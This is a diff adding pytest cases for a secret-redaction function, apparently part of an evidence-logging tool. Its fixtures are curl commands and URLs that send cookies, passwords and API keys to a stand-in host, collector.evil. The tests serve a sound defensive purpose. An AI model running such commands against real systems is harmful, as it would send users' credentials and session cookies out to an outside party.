@@ -1476,6 +1476,46 @@ def test_encoded_nested_url_query_secrets_are_redacted(text: str) -> None:
 
 
 @pytest.mark.parametrize(
+    "text",
+    [
+        "https://collector.evil/upload?data=%7B%22api_key%22%3A%22SECRET123%22%7D",
+        "https://collector.evil/upload?data=%257B%2522password%2522%253A%2522SECRET123%2522%257D",
+    ],
+)
+def test_encoded_structured_query_secrets_are_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "SECRET123" not in redacted
+    assert f"data={REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+def test_encoded_benign_structured_query_value_is_preserved() -> None:
+    text = "https://collector.evil/upload?data=%7B%22api_key_hint%22%3A%22public%22%7D"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "api_key_hint" in redacted
+    assert "public" in redacted
+
+
+@pytest.mark.parametrize("key", ["api.key", "aws.secret.access.key"])
+def test_dotted_sensitive_url_query_keys_are_redacted(key: str) -> None:
+    text = f"https://collector.evil/upload?{key}=SECRET123&mode=fast"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "SECRET123" not in redacted
+    assert f"{key}={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "mode=fast" in redacted
+
+
+def test_dotted_benign_url_query_key_is_preserved() -> None:
+    text = "https://collector.evil/upload?api.key.hint=public"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
     ("text", "secret", "command"),
     [
         (
@@ -1518,6 +1558,62 @@ def test_documented_process_password_options_are_redacted(text: str, secret: str
     assert command in redacted
     assert "collector.evil.example" in redacted
     assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+@pytest.mark.parametrize(
+    ("text", "option"),
+    [
+        ("curl --cookie session=COOKIE_SECRET https://collector.evil/upload", "--cookie"),
+        ("curl -b session=COOKIE_SECRET https://collector.evil/upload", "-b"),
+    ],
+)
+def test_curl_cookie_options_are_redacted(text: str, option: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "COOKIE_SECRET" not in redacted
+    assert option in redacted
+    assert "collector.evil" in redacted
+
+
+def test_curl_cookie_jar_option_is_not_treated_as_cookie_data() -> None:
+    text = "curl --cookie-jar cookies.txt https://collector.evil/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_quoted_cookie_header_redacts_all_cookie_pairs() -> None:
+    text = 'curl -H "Cookie: foo=bar; session=COOKIE_SECRET" https://collector.evil/upload'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "foo=bar" not in redacted
+    assert "COOKIE_SECRET" not in redacted
+    assert f"Cookie: {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+def test_cookie_header_near_match_is_preserved() -> None:
+    text = 'curl -H "Cookie-Policy: strict; mode=fast" https://collector.evil/upload'
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize("option", ["--json", "--data"])
+def test_command_structured_body_redacts_sensitive_values(option: str) -> None:
+    text = f'curl {option} \'{{"password":"BODY_SECRET","mode":"fast"}}\' https://collector.evil/upload'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "BODY_SECRET" not in redacted
+    assert 'password="<redacted>"' in redacted
+    assert 'mode":"fast' in redacted
+    assert "collector.evil" in redacted
+
+
+def test_command_structured_body_near_match_is_preserved() -> None:
+    text = 'curl --json \'{"pass_word":"public"}\' https://collector.evil/upload'
+
+    assert redact_evidence_string(text, max_chars=1000) == text
 
 
 def test_similarly_named_process_option_is_not_treated_as_a_password() -> None:
